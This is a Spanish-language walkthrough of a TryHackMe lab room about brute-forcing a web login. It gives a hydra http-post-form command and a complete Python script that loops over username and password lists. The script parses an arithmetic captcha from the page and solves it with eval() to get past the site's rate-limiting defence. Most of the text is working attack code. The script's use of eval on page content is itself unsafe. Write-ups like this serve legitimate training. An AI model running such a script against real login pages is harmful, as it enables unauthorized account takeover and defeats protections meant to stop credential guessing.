Bienveidos a otra sala en tryhackme. En esta ocasion, utilizaremos un script python para hacer fuerza bruta a una pagina web obteniendo las credenciales y pasando por alto la verificacion captcha que tiene como seguridad.

# Brute-Force

Intentamos el metodo conocido con hydra con http-post-form:

`hydra -L usernames.txt -P passwords.txt "http-post-form://IPTARGET/login:username=^USER^&password=^PASS^:Error"`

Pero no tuvimos exito, al intentar varias veces logear en la pagina web, podemos notar que tiene como seguridad establecer un codigo captcha para poder ingresar. Para este caso, utilizamos un script en python para saltear este metodo de seguridad y asi poder hacer fuerza bruta sin que nos limite la tarea el captcha .

```python
import requests
from bs4 import BeautifulSoup

#set some vars
url = 'http://IPTARGET/login'
usernames = open('usernames.txt', 'r')
passwords = open('passwords.txt', 'r')

for username in usernames:
        #don't forget to stip the newline
        username = username.strip('\n')
        passwords.seek(0)
        for password in passwords:
                #get the page to read the captcha
                session = requests.Session()
                response = session.get(url)
                data = {'username': 'username', 'password': 'password'}
                response = session.post(url, data = data)
                soup = BeautifulSoup(response.text, 'html.parser')
                #grab the values 
                captcha_equation = soup.select_one('label[for="usr"] + br').next_sibling.strip()
                result = eval(captcha_equation.split("=")[0])

                password = password.strip('\n')
                data = {'username': username, 'password': password, 'captcha': result}
                response = session.post(url, data = data)
                print("[*] Attempting password: %s for user: %s" % (password, username))
                if 'does not exist' not in response.text:
                        print('[*] found username:' + username)
                        log = open('logs.txt', 'w')
                        if 'Invalid password' not in response.text:
                                print('[*] found password:' + password)
                                log.write(username + ' ' + password)
                                exit()
                        else:
                                print('[*] password invalid')
                else:
                        break
```

Dejaremos trabajar al script y obtendremos ,con tiempo y paciencia, sus credenciales para luego acceder al servidor web y obtener nuestra flag.